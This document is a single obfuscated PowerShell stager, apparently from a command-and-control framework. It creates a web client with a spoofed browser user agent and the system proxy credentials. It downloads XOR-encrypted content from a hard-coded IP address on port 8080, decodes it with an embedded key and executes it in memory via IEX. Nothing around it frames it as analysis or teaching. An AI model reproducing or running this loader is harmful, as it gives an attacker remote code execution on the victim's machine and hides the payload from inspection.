
$wC=NEW-OBJEct SYSTEm.NeT.WeBCLiENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeaDErs.Add('User-Agent',$u);$wC.PrOxY = [SYStEM.NEt.WeBReQUeST]::DeFAulTWeBPRoXY;$wc.PrOXy.CREDEnTIALS = [SYstEm.NEt.CrEDeNTIaLCaCHE]::DEFAultNETWoRkCredeNtials;$K='3f33607bb4a1f7756ea12c2a960372db';$I=0;[Char[]]$b=([chaR[]]($wc.DownlOADSTRinG("http://104.233.102.23:8080/index.asp")))|%{$_-bXor$K[$i++%$K.LENGth]};IEX ($b-jOiN'')

